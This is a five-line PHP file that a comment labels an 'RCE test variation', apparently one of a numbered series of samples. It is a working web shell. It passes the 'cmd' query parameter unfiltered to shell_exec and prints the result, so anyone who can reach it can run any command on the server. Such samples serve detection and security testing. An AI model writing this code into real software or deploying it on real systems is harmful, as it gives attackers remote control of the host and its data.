<?php
// RCE test variation #1215
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>